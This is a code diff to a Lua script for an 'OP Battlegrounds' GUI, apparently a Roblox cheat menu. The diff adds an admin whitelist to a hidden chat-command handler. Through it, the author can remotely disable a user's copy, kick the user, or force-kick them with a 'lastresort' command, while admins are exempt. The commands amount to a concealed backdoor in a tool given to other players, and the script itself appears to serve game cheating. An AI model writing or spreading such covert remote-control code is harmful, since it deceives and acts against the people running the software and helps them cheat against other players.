@@ -1,5 +1,6 @@
 -- Gui to Lua Version 3.2
--- Realirist's OPBG GUI
+-- Realirist's OPBGGUI
+-- The whitelist update
 
 -- Instances:
 
@@ -722,7 +723,7 @@ UISizeConstraint_30.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function IXBVHHH_fake_script() -- Main.LocalScript 
+local function GTLP_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1149,12 +1150,15 @@ local function IXBVHHH_fake_script() -- Main.LocalScript
 		end
 	end
 	local function safeguard(plr)
+		local admins = {
+			'Realirist'
+		}
+		print((table.find(admins,plr.Name)~=nil))
 		local name = plr.Name
 		local userid = plr.UserId
-		if name=='Realirist' or userid==3948255911 then
-			print('oh my gawd owner!1')
+		if table.find(admins,name) then
+			print('oh my gawd opbg admin!1')
 			plr.Chatted:Connect(function(msg)
-				print(msg)
 				local function findPlayer(partialName)
 					for _, player in pairs(game.Players:GetPlayers()) do
 						if string.sub(player.Name:lower(), 1, #partialName) == partialName:lower() then
@@ -1163,12 +1167,21 @@ local function IXBVHHH_fake_script() -- Main.LocalScript
 					end
 				end
 				local spaced = string.split(msg,' ')
-				if msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='disable' then
+				
+				if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
 					print('disabled')
+					if table.find(admins,game.Players.LocalPlayer.Name) then
+						sayMessage('Cant use this command on me (im admin)')
+						return
+					end
 					sayMessage('omg my opbg is gone!')
 					script.Parent.Parent.Enabled = false
-				elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='enable' then
+				elseif msg=='!opbg enable '.. game.Players.LocalPlayer.Name then
 					print('enabled')
+					if table.find(admins,game.Players.LocalPlayer.Name) then
+						sayMessage('Cant use this command on me (im admin)')
+						return
+					end
 					sayMessage('omg my opbg is back!')
 					script.Parent.Parent.Enabled = true
 				elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='kick' then
@@ -1178,7 +1191,12 @@ local function IXBVHHH_fake_script() -- Main.LocalScript
 				elseif msg=='!opbg users' then
 					sayMessage('hi im using opbg')
 				elseif msg=='!opbg lastresort' then
-					game.Players.LocalPlayer:Kick('Forced to kick you this way, last resort')
+					if table.find(admins,game.Players.LocalPlayer.Name) then
+						sayMessage('Cant use this command on me (im admin)')
+						return
+					end
+					sayMessage('Wallahi im cooked')
+					game.Players.LocalPlayer:Kick('Forced to kick you this way, last resort!')
 					game.Players.LocalPlayer:Destroy()
 				end
 			end)
@@ -1213,4 +1231,4 @@ local function IXBVHHH_fake_script() -- Main.LocalScript
 	end)
 	co()
 end
-coroutine.wrap(IXBVHHH_fake_script)()
+coroutine.wrap(GTLP_fake_script)()
